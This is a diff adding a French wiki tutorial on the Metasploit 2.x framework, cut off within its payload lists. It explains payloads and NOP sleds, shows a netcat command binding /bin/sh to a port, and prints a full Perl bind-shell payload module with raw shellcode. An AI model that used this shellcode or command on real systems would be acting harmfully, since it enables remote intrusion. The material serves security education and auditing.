@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="client-nojs">
+<head>
+<meta charset="UTF-8" />
+<title>Metasploit 2.x - Deimos.fr / Bloc Notes Informatique</title>
+<meta name="generator" content="MediaWiki 1.25.5" />
+<link rel="shortcut icon" href="https://wiki.deimos.fr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="opensearch_desc.php" title="Deimos.fr / Bloc Notes Informatique (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="https://wiki.deimos.fr/api.php?action=rsd" />
+<link rel="alternate" hreflang="x-default" href="Metasploit_2.x.html" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr" />
+<link rel="alternate" type="application/atom+xml" title="Deimos.fr / Bloc Notes Informatique Atom feed" href="https://wiki.deimos.fr/index.php?title=Special:RecentChanges&amp;feed=atom" />
+<link rel="stylesheet" href="load.php%3Fdebug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint,shared|mediawiki.sectionAnchor|mediawiki.skinning.interface|mediawiki.ui.button|skins.vector.styles&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<link rel="stylesheet" href="load.php%3Fdebug=false&amp;lang=en&amp;modules=site&amp;only=styles&amp;skin=vector&amp;*.css" />
+<style>a:lang(ar),a:lang(kk-arab),a:lang(mzn),a:lang(ps),a:lang(ur){text-decoration:none}
+/* cache key: blocnotesinfo-wiki_:resourceloader:filter:minify-css:7:6f8c0c45eefd74c7bbe9478b32df38c0 */</style>
+<script src="load.php%3Fdebug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if(window.mw){
+mw.config.set({"wgCanonicalNamespace":"","wgCanonicalSpecialPageName":false,"wgNamespaceNumber":0,"wgPageName":"Metasploit_2.x","wgTitle":"Metasploit 2.x","wgCurRevisionId":5323,"wgRevisionId":5323,"wgArticleId":2373,"wgIsArticle":true,"wgIsRedirect":false,"wgAction":"view","wgUserName":null,"wgUserGroups":["*"],"wgCategories":[],"wgBreakFrames":false,"wgPageContentLanguage":"en","wgPageContentModel":"wikitext","wgSeparatorTransformTable":["",""],"wgDigitTransformTable":["",""],"wgDefaultDateFormat":"dmy","wgMonthNames":["","January","February","March","April","May","June","July","August","September","October","November","December"],"wgMonthNamesShort":["","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"wgRelevantPageName":"Metasploit_2.x","wgRelevantArticleId":2373,"wgIsProbablyEditable":false,"wgRestrictionEdit":[],"wgRestrictionMove":[],"wgWikiEditorEnabledModules":{"toolbar":true,"dialogs":true,"hidesig":true,"preview":true,"publish":false}});
+}</script><script>if(window.mw){
+mw.loader.implement("user.options",function($,jQuery){mw.user.options.set({"variant":"en"});});mw.loader.implement("user.tokens",function($,jQuery){mw.user.tokens.set({"editToken":"+\\","patrolToken":"+\\","watchToken":"+\\"});});
+/* cache key: blocnotesinfo-wiki_:resourceloader:filter:minify-js:7:a5c52c063dc436c1ca7c9f456936a5e9 */
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.page.startup","mediawiki.legacy.wikibits","mediawiki.legacy.ajax","skins.vector.js"]);
+}</script>
+<style type="text/css">/*<![CDATA[*/
+.source-text {line-height: normal;}
+.source-text li, .source-text pre {
+	line-height: normal; border: 0px none white;
+}
+/**
+ * GeSHi Dynamically Generated Stylesheet
+ * --------------------------------------
+ * Dynamically generated stylesheet for text
+ * CSS class: source-text, CSS id: 
+ * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
+ * (http://qbnz.com/highlighter/ and http://geshi.org/)
+ * --------------------------------------
+ */
+.text.source-text .de1, .text.source-text .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;font-family: monospace, monospace;}
+.text.source-text  {font-family:monospace;}
+.text.source-text .imp {font-weight: bold; color: red;}
+.text.source-text li, .text.source-text .li1 {font-weight: normal; vertical-align:top;}
+.text.source-text .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
+.text.source-text .li2 {font-weight: bold; vertical-align:top;}
+.text.source-text .ln-xtra, .text.source-text li.ln-xtra, .text.source-text div.ln-xtra {background-color: #ffc;}
+.text.source-text span.xtra { display:block; }
+
+/*]]>*/
+</style>
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/skins/Vector/csshover.min.htc")}</style><![endif]-->
+</head>
+<body class="mediawiki ltr sitedir-ltr ns-0 ns-subject page-Metasploit_2_x skin-vector action-view vector-animateLayout">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<div id="content" class="mw-body" role="main">
+			<a id="top"></a>
+
+						<h1 id="firstHeading" class="firstHeading" lang="en"><span dir="auto">Metasploit 2.x</span></h1>
+						<div id="bodyContent" class="mw-body-content">
+									<div id="siteSub">From Deimos.fr / Bloc Notes Informatique</div>
+								<div id="contentSub"></div>
+												<div id="jump-to-nav" class="mw-jump">
+					Jump to:					<a href="Metasploit_2.x.html#mw-navigation">navigation</a>, 					<a href="Metasploit_2.x.html#p-search">search</a>
+				</div>
+				<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><div id="toc" class="toc"><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Metasploit_2.x.html#Introduction"><span class="tocnumber">1</span> <span class="toctext">Introduction</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Metasploit_2.x.html#Introduction_et_pr.C3.A9sentation"><span class="tocnumber">2</span> <span class="toctext">Introduction et présentation</span></a>
+<ul>
+<li class="toclevel-2 tocsection-3"><a href="Metasploit_2.x.html#Pr.C3.A9sentation_g.C3.A9n.C3.A9rale"><span class="tocnumber">2.1</span> <span class="toctext">Présentation générale</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-4"><a href="Metasploit_2.x.html#Introduction_aux_charges_utiles_.28payloads.29"><span class="tocnumber">3</span> <span class="toctext">Introduction aux charges utiles (payloads)</span></a>
+<ul>
+<li class="toclevel-2 tocsection-5"><a href="Metasploit_2.x.html#Commande_c.C3.B4t.C3.A9_serveur"><span class="tocnumber">3.1</span> <span class="toctext">Commande côté serveur</span></a></li>
+<li class="toclevel-2 tocsection-6"><a href="Metasploit_2.x.html#Commandes_c.C3.B4t.C3.A9_client"><span class="tocnumber">3.2</span> <span class="toctext">Commandes côté client</span></a></li>
+<li class="toclevel-2 tocsection-7"><a href="Metasploit_2.x.html#Localisation_et_d.C3.A9veloppement"><span class="tocnumber">3.3</span> <span class="toctext">Localisation et développement</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-8"><a href="Metasploit_2.x.html#Les_charges_utiles_disponibles"><span class="tocnumber">4</span> <span class="toctext">Les charges utiles disponibles</span></a>
+<ul>
+<li class="toclevel-2 tocsection-9"><a href="Metasploit_2.x.html#Payloads_BSD"><span class="tocnumber">4.1</span> <span class="toctext">Payloads BSD</span></a></li>
+<li class="toclevel-2 tocsection-10"><a href="Metasploit_2.x.html#Payloads_g.C3.A9n.C3.A9riques"><span class="tocnumber">4.2</span> <span class="toctext">Payloads génériques</span></a></li>
+<li class="toclevel-2 tocsection-11"><a href="Metasploit_2.x.html#Payload_Irix"><span class="tocnumber">4.3</span> <span class="toctext">Payload Irix</span></a></li>
+<li class="toclevel-2 tocsection-12"><a href="Metasploit_2.x.html#Payloads_Linux"><span class="tocnumber">4.4</span> <span class="toctext">Payloads Linux</span></a></li>
+<li class="toclevel-2 tocsection-13"><a href="Metasploit_2.x.html#Payloads_Mac_OS_X"><span class="tocnumber">4.5</span> <span class="toctext">Payloads Mac OS X</span></a></li>
+<li class="toclevel-2 tocsection-14"><a href="Metasploit_2.x.html#Payloads_Solaris"><span class="tocnumber">4.6</span> <span class="toctext">Payloads Solaris</span></a></li>
+<li class="toclevel-2 tocsection-15"><a href="Metasploit_2.x.html#Payloads_Windows"><span class="tocnumber">4.7</span> <span class="toctext">Payloads Windows</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-16"><a href="Metasploit_2.x.html#La_charge_utile_Meterpreter"><span class="tocnumber">5</span> <span class="toctext">La charge utile Meterpreter</span></a></li>
+<li class="toclevel-1 tocsection-17"><a href="Metasploit_2.x.html#Scripting"><span class="tocnumber">6</span> <span class="toctext">Scripting</span></a></li>
+<li class="toclevel-1 tocsection-18"><a href="Metasploit_2.x.html#M.C3.A9thodologie_d.E2.80.99un_audit_de_s.C3.A9curit.C3.A9"><span class="tocnumber">7</span> <span class="toctext">Méthodologie d’un audit de sécurité</span></a>
+<ul>
+<li class="toclevel-2 tocsection-19"><a href="Metasploit_2.x.html#Machine_virtuelle_Windows_2000"><span class="tocnumber">7.1</span> <span class="toctext">Machine virtuelle Windows 2000</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-20"><a href="Metasploit_2.x.html#Conclusion"><span class="tocnumber">8</span> <span class="toctext">Conclusion</span></a></li>
+<li class="toclevel-1 tocsection-21"><a href="Metasploit_2.x.html#Ressources"><span class="tocnumber">9</span> <span class="toctext">Ressources</span></a></li>
+</ul>
+</div>
+
+<h1><span class="mw-headline" id="Introduction"><span class="mw-headline-number">1</span> Introduction</span></h1>
+<p>Metasploit est une plateforme de codes intrusifs développée par le chercheur en sécurité informatique HD Moore. S'appuyant sur une base d'exploits conséquente et un rythme soutenu de développement, Metasploit s'est imposé comme une référence dans les domaines du logiciel libre et de la sécurité informatique.
+</p>
+<h1><span class="mw-headline" id="Introduction_et_pr.C3.A9sentation"><span class="mw-headline-number">2</span> Introduction et présentation</span></h1>
+<p>NDLR&#160;: ce dossier a été réalisé avec la branche 2.x de Metasploit et plus précisément avec la version 2.5&#160;; la version la plus récente actuelle de cette branche est la version 2.7 de Metasploit. A noter que les versions de la branche 3.x sont maintenant disponibles sur le site officiel de Metasploit, la version la plus récente proposée en téléchargement sur ce site étant la 3.0. La branche 3.x a été développée autour du langage Ruby contrairement à la branche 2.x qui s'appuie elle largement sur le langage PERL&#160;; parmi les nouveautés apportées par la branche 3.x on retrouve la simplification de l’écriture des exploits et le support de la reconnaissance automatique de réseaux grâce aux plugins «&#160;recon&#160;» au même titre que celui des techniques d'évasions (IDS/IPS/Antivirus) tout en gardant comme souci principal la portabilité de l'ensemble.
+</p><p><br />
+Metasploit s’est imposée comme la plateforme de codes intrusifs - plus connus sous le nom d’exploits - la plus en vogue actuellement. Les raisons en sont nombreuses, mais citons notamment sa licence GPLv2 ( General Public Licence ) ainsi que sa gratuité qui en font un outil très apprécié par la communauté.
+</p><p>Son auteur de talent, HD Moore, n’a pas eu de mal à faire connaître son outil grâce aux nombreuses options qu’il a ajoutées, en relativement peu de temps.
+</p><p>Le framework est développé essentiellement en Perl, mais contient également du code C, de l’assembleur, et du Python.
+</p><p>La communauté «&#160;Full disclosure&#160;», ayant pour habitude de publier les codes d’exploitation des failles (plus communément appelés «&#160;Proof of Concept&#160;» ou PoC) sous forme de codes source en C ou Perl en général, commence à changer ses habitudes, et il n’est désormais pas rare de voir des fichiers «&#160;.pm&#160;» en attachement de mails sur les mailing-lists concernées (dont la plus connue d’entre elles reste bugtraq). Ces fichiers sont des plugins Metasploit directement utilisables sur le framework, sans compilation préalable.
+</p><p>La documentation abondante autour de ce projet permet, aux initiés, il faut le reconnaître, de développer rapidement des plugins complets (exploits, payloads, etc.). Les <a rel="nofollow" class="external text" href="http://www.milw0rm.com/">exploits</a> sous forme de plugins Metasploit sont ainsi développés plus rapidement, et bénéficient d’une meilleure portabilité (Windows notamment, grâce à un environnement Cygwin adapté spécialement).
+</p><p>Un pré requis essentiel à la lecture de cet article est la connaissance des bases de l’écriture de codes malicieux ( principes des buffer overflows, <a rel="nofollow" class="external text" href="http://www.cgsecurity.org/Articles/SecProg/Art4/index-fr.html">bugs de format</a>).
+</p><p>Metasploit est téléchargeable sur le <a rel="nofollow" class="external text" href="http://www.metasploit.org/">site officiel</a> en archive GNU/LINUX ou en «&#160;installer&#160;» Windows. Les deux environnements étant entièrement similaires, nous ne ferons pas de distinction tout au long de cet article. 
+</p>
+<h2><span class="mw-headline" id="Pr.C3.A9sentation_g.C3.A9n.C3.A9rale"><span class="mw-headline-number">2.1</span> Présentation générale</span></h2>
+<p>La plateforme Metasploit se présente avec une arborescence claire et très détaillée&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">$ ls
+[data] [exploits] msfcli msfencode
+msfpescan [nops] [src] [docs]
+[extras] msfconsole msflogdump msfupdate
+[payloads] [tools] [encoders] [lib]
+msfelfscan msfpayload msfweb [sdk]</pre></div></div>
+<p>Les répertoires les plus pertinents dans le cadre de cet article sont&#160;:
+</p>
+<ul><li> extras/ qui contient des suppléments pour la complétion automatique et le support SSL. Il s’agit de 2 archives à ins taller (perl Makefile.PL &amp;&amp; make &amp;&amp; make install).</li></ul>
+<ul><li> encoders/ contenant différents encodeurs de payloads, <a rel="nofollow" class="external text" href="http://fr.wikipedia.org/wiki/NOP">NOPs</a> ( No Operation ), permettant par exemple de xorer (chiffrer avec «&#160;l’algorithme&#160;» XOR – <a rel="nofollow" class="external text" href="http://fr.wikipedia.org/wiki/XOR">eXclusive OR</a>) un payload et d’ajouter l’en-tête approprié (décodeur XOR) à la charge utile.</li></ul>
+<ul><li> exploits/ contenant l’ensemble des exploits mis à disposition par le framework. Les derniers exploits sont téléchargeables sur le site de Metasploit. Il est également possible de télécharger un «&#160;snapshot&#160;». Les exploits qui seront développés en parallèle devront être placés dans ce répertoire pour être utilisés dans Metasploit.</li></ul>
+<ul><li> docs/ contenant une abondante documentation qui couvre la quasi-intégralité des aspects techniques. Certains documents de ce répertoire sont d’ailleurs traduis en Français.</li></ul>
+<ul><li> payloads/ contenant les payloads des différentes architectures et systèmes d’exploitation.</li></ul>
+<ul><li> sdk/ regroupant différentes ressources pour les développeurs&#160;: générateur de codes pm pour les buffer overflows, les bugs de format… Il contient également quelques tutoriaux pour s’initier au développement de modules .pm pour Metasploit. Un exemple sera d’ailleurs repris dans le chapitre ci-dessous concernant le scripting.</li></ul>
+<ul><li> tools/ contenant plusieurs outils complémentaires à la plateforme permettant de dumper (récupérer) le contenu de l’adressage mémoire d’un processus, ou encore de lancer le serveur socketninja.pl qui permet des exploitations multiples et simultanées&#160;: les cibles se connectant ainsi sur ce serveur en connect back.</li></ul>
+<p>Pour rappel, les différentes interfaces disponibles dans le framework sont&#160;:
+</p>
+<ul><li> msfcli pour une exploitation entièrement automatisée en ligne de commande. Cette «&#160;interface&#160;» rudimentaire est utilisée de préférence dans des scripts externes et est relativement austère pour une utilisation temps réel par un utilisateur.</li></ul>
+<ul><li> msfconsole est «&#160;l’interface de prédilection&#160;» car elle présente le meilleur compromis entre clarté et rapidité d’utilisation. La complétion et l’aide disponible à tout moment («&#160;help&#160;») permettent de se familiariser rapidement avec cette interface «&#160;à étages&#160;».</li></ul>
+<ul><li> msfweb est un GUI (Graphical User Interface) accessible via un navigateur classique.</li></ul>
+<h1><span class="mw-headline" id="Introduction_aux_charges_utiles_.28payloads.29"><span class="mw-headline-number">3</span> Introduction aux charges utiles (payloads)</span></h1>
+<p>Une charge utile est une suite d'instructions qui est envoyée via un exploit pour rediriger le flux d’exécution d'une application faillible afin d'obtenir une invite de commande après compromission. Ces charges peuvent vous permettre entre autres d'exécuter des commandes distantes ou de récupérer une interface graphique.
+</p><p>Un payload (que nous pourrions traduire par charge utile), au sens de la plateforme Metasploit, est le code envoyé dans l’exploit permettant de rediriger le flux d’exécution de l’application vulnérable pour obtenir un shell (terminal de commande), exécuter une commande distante, récupérer l’interface graphique, lancer un serveur, etc.
+</p><p>La plupart du temps, il s’agit d’un shellcode qui est une suite d’opcodes ( <a rel="nofollow" class="external text" href="http://www.metasploit.com/opcode_database.html">codes propres à la plateforme et au système d’exploitation</a>) permettant d’exécuter des instructions. Le <a rel="nofollow" class="external text" href="http://www.secuobs.com/news/16092006-wishmaster.shtml">shellcode</a> est alors copié en mémoire sur la machine distante (via un buffer overflow, un bug de format, etc.) puis le flux d’exécution de l’application faillible est détourné pour le faire pointer sur ce shellcode.
+</p><p>Selon la taille du tampon (buffer) disponible, qui est fonction du bug, il peut être possible d’insérer des opcodes NOP (opcodes n’exécutant aucune tâche, simplement suite de sauts d’instruction NOP en instruction NOP) pour élargir la fenêtre d’exécution.
+</p><p>En effet, il n’est pas toujours évident de connaître l’emplacement en mémoire du shellcode envoyé (sauf pour les bugs de format typiquement), et l’utilisation d’un grand nombre de NOP permet de minimiser les risques d’erreur&#160;: le résultat sera identique si le flux est redirigé sur le premier NOP ou sur le 2500e par exemple.
+</p><p>Les opcodes de NOP Intel les plus connus sont 0x90 et 0x41 mais il en existe de nombreux autres, et il est également possible de créer des suites de NOP aléatoires en fonction du nombre de NOP à envoyer, permettant ainsi d’échapper aux IDS/IPS (<a rel="nofollow" class="external text" href="http://www.secuobs.com/news/16042006-ips_evasion.shtml">respectivement Intrusion Detection System et Intrusion Protection System</a> ) qui réagissent à des patterns de ce type.
+</p><p>Une suite équivalente de NOPs pourrait par exemple empiler puis dépiler une valeur sur la pile, ne modifiant pas le comportement de l’application, et ne pouvant donc pas entraîner de crash&#160;:
+</p>
+<pre>push EAX (opcode 0x50)
+pop EAX (opcode 0x58)
+</pre>
+<p>Ces deux instructions étant opposées et sans conséquence, nous pourrions remplacer une série de «&#160;0x90 0x90&#160;» («&#160;\x90\x90&#160;») par «&#160;0x50 0x58&#160;» («&#160;\x50\x58&#160;»). Il existe des générateurs permettant d’automatiser cette tâche ( <a rel="nofollow" class="external text" href="http://www.secdev.org/projects/shellforge/">shellforge</a> ).
+</p><p>Les shellcodes sont également spécifiques aux architectures pour diverses raisons dont des jeux d’instructions différents, des sens de lecture de la mémoire&#160;: <a rel="nofollow" class="external text" href="http://3bc.bertrand-blanc.com/endianness05.pdf">little/big endian</a>, etc.
+</p><p>Un bind shellcode consiste à exécuter sur la machine distante l’équivalent d’un serveur&#160;: un port ( <a rel="nofollow" class="external text" href="http://www.iprezo.org/?page=chap5">TCP ou UDP</a> ) se met alors en écoute de connexions entrantes et redirige les flux vers un shell («&#160;/bin/sh&#160;» sous GNU/Linux par exemple).
+</p><p>Il est possible de se faire une idée de ce processus grâce à l’outil <a rel="nofollow" class="external text" href="http://netcat.sourceforge.net/">netcat</a> qui permet de mettre en écoute un shell sur un port TCP&#160;:
+</p>
+<pre>$ nc –l –p 11000 –c /bin/sh
+</pre>
+<h2><span class="mw-headline" id="Commande_c.C3.B4t.C3.A9_serveur"><span class="mw-headline-number">3.1</span> Commande côté serveur</span></h2>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">$ nc localhost 11000
+pwd
+/home/user
+date
+ven dc 2 19:53:08 CET 2005
+nc serveurssh 22
+SSH-2.0-OpenSSH_3.8.1p1 Debian-8.sarge.4</pre></div></div>
+<h2><span class="mw-headline" id="Commandes_c.C3.B4t.C3.A9_client"><span class="mw-headline-number">3.2</span> Commandes côté client</span></h2>
+<p>Un reverse shellcode permet d’obtenir un comportement de client standard sur la machine exploitée, c'est-à-dire qu’elle établira une connexion sur une machine définie (fixée dans le payload envoyé) et lancera alors un shell que le «&#160;serveur&#160;» pourra contrôler. Les reverse shellcodes permettent parfois d’outrepasser des règles de filtrage sur des <a rel="nofollow" class="external text" href="http://fr.wikipedia.org/wiki/Pare-feu">firewalls</a> de <a rel="nofollow" class="external text" href="http://www.frameip.com/osi-tcpip/">niveau 3</a>.
+</p><p>Il est également possible de combiner des attaques de reverse shellcode avec des injections (dans des processus, threads, …) afin de contourner des pare-feux applicatifs. Ces types de shellcodes sont également appelés shellcodes connect back. Plusieurs commandes concernant les payloads sont disponibles dans Metasploit. En voici certaines&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">msf &gt; info payload win32_bind_vncinject
+&#160;
+Name: Windows Bind VNC Server DLL Inject
+Version: $Revision: 1.18 $
+OS/CPU: win32/x86
+Needs Admin: No
+Multistage: Yes
+Total Size: 287
+Keys: bind
+&#160;
+Provided By:
+Matt Miller
+H D Moore
+(…)
+&#160;
+Description:
+Listen for connection and inject a VNC server into the remote process
+&#160;
+&#160;
+msf lsass_ms04_011(win32_bind_vncinject) &gt; show options
+&#160;
+Exploit and Payload Options
+===========================
+&#160;
+Exploit: Name Default Description
+-------- ------- ------- ---------------------------------------
+required RHOST The target address
+optional SMBDOM The domain for specified SMB username
+required RPORT 139 The target port
+optional SMBUSER The SMB username to connect with
+optional SMBPASS The password for specified SMB username
+&#160;
+Payload: Name Default Description
+required VNCDLL /home/user/Softs/Securite/Progs/metasploit_2.5/data/vncdll.dll The full path the VNC service dll
+required EXITFUNC thread Exit technique: &quot;process&quot;, &quot;thread&quot;, &quot;seh&quot;
+required AUTOVNC 1 Automatically launch vncviewer
+required VNCPORT 5900 The local port to use for the VNC proxy
+required LPORT 4444 Listening port for bind shell</pre></div></div>
+<p>Il est ensuite possible de définir les options normalement&#160;: set OPTION [VALEUR].
+</p>
+<h2><span class="mw-headline" id="Localisation_et_d.C3.A9veloppement"><span class="mw-headline-number">3.3</span> Localisation et développement</span></h2>
+<p>Les payloads de Metasploit sont localisés dans le répertoire «&#160;payloads/&#160;». Leur rédaction est très simple et il est possible d’implémenter de nouvelles extensions très rapidement. Nous allons détailler ci-dessous le payload linux_ia32_bind qui permet d’exécuter un shellcode sur un port distant défini en argument (set LPORT 12345).
+</p><p>Les premières parties sont «&#160;déclaratives&#160;»&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">package Msf::Payload::linux_ia32_bind;
+use strict;
+use base 'Msf::PayloadComponent::BindConnection';</pre></div></div>
+<p>Puis les détails qui seront ensuite interfacés dans Metasploit sont définis dans une structure $info. Il s’agit ici d’un payload destiné à des Linux <a rel="nofollow" class="external text" href="http://www.intel.com/products/processor/manuals/index.htm">Intel 32 bits</a> sans élévation de privilège (pas de <a rel="nofollow" class="external text" href="http://www.cs.berkeley.edu/~daw/papers/setuid-usenix02.pdf">set(r)(e)uid</a> dans le shellcode)&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">my $info =
+{
+'Name' =&gt; 'Linux IA32 Bind Shell',
+'Version' =&gt; '$Revision: 1.2 $',
+'Description' =&gt; 'Listen for connection and spawn a shell',
+'Authors' =&gt; [ 'skape ', 'vlad902 ' ],
+'Arch' =&gt; [ 'x86' ],
+'Priv' =&gt; 0,
+'OS' =&gt; [ 'linux' ],
+'Size' =&gt; '',
+};</pre></div></div>
+<p>La taille est ensuite calculée automatiquement dans le constructeur, avec un argument LPORT pour définir le port qui sera mis en écoute (modification d’une partie du shellcode «&#160;à la volée&#160;» par une couche d’abstraction)&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">sub new
+{
+my $class = shift;
+my $hash = @_&#160;? shift&#160;: { };
+$hash = $class-&gt;MergeHashRec($hash, {'Info' =&gt; $info});
+my $self = $class-&gt;SUPER::new($hash, @_);
+$self-&gt;_Info-&gt;{'Size'} = $self-&gt;_GenSize;
+return($self);
+}
+&#160;
+sub Build
+{
+my $self = shift;
+return($self-&gt;Generate($self-&gt;GetVar('LPORT')));
+}</pre></div></div>
+<p>Le code peut alors être généré et modifié avec les options que l’utilisateur pourra définir. Ici, le choix du port en écoute est fait avec l’argument LPORT qui modifiera les octets concernés. La fonction pack avec le template «&#160;n&#160;» permet de convertir la valeur passée en argument en entier non signé (unsigned int) de type réseau (big endian).
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">sub Generate
+{
+my $self = shift;
+my $port = shift;
+my $off_port = 0x14;
+my $port_bin = pack('n', $port);
+my $shellcode =
+&quot;\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96&quot; .
+&quot;\x43\x52\x66\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56&quot; .
+&quot;\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1&quot; .
+&quot;\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0&quot; .
+&quot;\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53&quot; .
+&quot;\x89\xe1\xcd\x80&quot;;
+&#160;
+substr($shellcode, $off_port, 2, $port_bin);
+&#160;
+return($shellcode);
+}
+&#160;
+sub _GenSize
+{
+my $self = shift;
+my $bin = $self-&gt;Generate('4444');
+return(length($bin));
+}
+1;</pre></div></div>
+<h1><span class="mw-headline" id="Les_charges_utiles_disponibles"><span class="mw-headline-number">4</span> Les charges utiles disponibles</span></h1>
+<p>Retrouvez dans cette partie du dossier, consacré à la plateforme d'exploitation Metasploit, la liste de l'ensemble des charges utiles disponibles sur cette plateforme afin de réaliser vos audits de sécurité de façon intrusive. Ces charges utiles sont disponibles pour de multiples systèmes d'exploitation (BSD, Linux, Windows, solaris, ...).
+</p>
+<h2><span class="mw-headline" id="Payloads_BSD"><span class="mw-headline-number">4.1</span> Payloads BSD</span></h2>
+<p>Les payloads pour les systèmes d’exploitation BSD et BSDi sont disponibles pour des architectures Intel 32 bits (x86) et <a rel="nofollow" class="external text" href="http://www.irisa.fr/caps/projects/TechnologicalSurvey/micro/PI-957-html/chapter2_8.html">Sparc</a>.
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">bsd_ia32_bind
+BSD IA32 Bind Shell
+&#160;
+bsd_ia32_bind_stg
+BSD IA32 Staged Bind Shell
+&#160;
+bsd_ia32_exec
+BSD IA32 Execute Command
+&#160;
+bsd_ia32_findrecv
+BSD IA32 Recv Tag Findsock Shell
+&#160;
+bsd_ia32_findrecv_stg
+BSD IA32 Staged Findsock Shell
+&#160;
+bsd_ia32_findsock
+BSD IA32 SrcPort Findsock Shell
+&#160;
+bsd_ia32_reverse
+BSD IA32 Reverse Shell
+&#160;
+bsd_ia32_reverse_stg
+BSD IA32 Staged Reverse Shell
+&#160;
+bsd_sparc_bind
+BSD SPARC Bind Shell
+&#160;
+bsd_sparc_reverse
+BSD SPARC Reverse Shell
+&#160;
+bsdi_ia32_bind
+BSDi IA32 Bind Shell
+&#160;
+bsdi_ia32_bind_stg
+BSDi IA32 Staged Bind Shell
+&#160;
+bsdi_ia32_findsock
+BSDi IA32 SrcPort Findsock Shell
+&#160;
+bsdi_ia32_reverse
+BSDi IA32 Reverse Shell
+&#160;
+bsdi_ia32_reverse_stg
+BSDi IA32 Staged Reverse Shell</pre></div></div>
+<h2><span class="mw-headline" id="Payloads_g.C3.A9n.C3.A9riques"><span class="mw-headline-number">4.2</span> Payloads génériques</span></h2>
+<p>Ils sont destinés à des exploitations dont les shellcodes ne nécessitent pas d'opcodes.
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">cmd_generic
+Arbitrary Command
+&#160;
+cmd_interact
+Unix Interactive Shell
+&#160;
+cmd_irix_bind
+Irix Inetd Bind Shell
+&#160;
+cmd_localshell
+Interactive Local Shell
+&#160;
+cmd_sol_bind
+Solaris Inetd Bind Shell
+&#160;
+cmd_unix_reverse
+Unix Telnet Piping Reverse Shell
+&#160;
+cmd_unix_reverse_bash
+Unix /dev/tcp Piping Reverse Shell
+&#160;
+cmd_unix_reverse_nss
+Unix Spaceless Telnet Piping Reverse Shell
+&#160;
+generic_sparc_execve
+BSD/Linux/Solaris SPARC Execute Shell</pre></div></div>
+<h2><span class="mw-headline" id="Payload_Irix"><span class="mw-headline-number">4.3</span> Payload Irix</span></h2>
+<p>Le payload Irix disponible sur la plateforme Metasploit permet d’exécuter un shell en redirigeant l’entrée et la sortie standard vers le descripteur de fichier utilisé par la connexion en cours (à la façon de la commande dup(file_descriptor).
+</p>
+<pre>irix_mips_execve
+Irix MIPS Execute Shell
+</pre>
+<h2><span class="mw-headline" id="Payloads_Linux"><span class="mw-headline-number">4.4</span> Payloads Linux</span></h2>
+<p>Les payloads Metasploit disponibles pour Linux supportent les architectures Intel classiques 32 bit et Sparc. Certains payloads permettent de contourner des règles de filtrage négligentes, notamment via des reverse shellcodes. linux_ia32_reverse_udp permet, par exemple, d’outrepasser des pare-feux mal configurés pour la résolution de noms (trafic souvent «&#160;ouvert&#160;» pour le port source/destination UDP/53).
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">linux_ia32_adduser
+Linux IA32 Add User
+&#160;
+linux_ia32_bind
+Linux IA32 Bind Shell
+&#160;
+linux_ia32_bind_stg
+Linux IA32 Staged Bind Shell
+&#160;
+linux_ia32_exec
+Linux IA32 Execute Command
+&#160;
+linux_ia32_findrecv
+Linux IA32 Recv Tag Findsock Shell
+&#160;
+linux_ia32_findrecv_stg
+Linux IA32 Staged Findsock Shell
+&#160;
+linux_ia32_findsock
+Linux IA32 SrcPort Findsock Shell
+&#160;
+linux_ia32_reverse
+Linux IA32 Reverse Shell
+&#160;
+linux_ia32_reverse_impurity
+Linux IA32 Reverse Impurity Upload/Execute
+&#160;
+linux_ia32_reverse_stg
+Linux IA32 Staged Reverse Shell
+&#160;
+linux_ia32_reverse_udp
+Linux IA32 Reverse UDP Shell
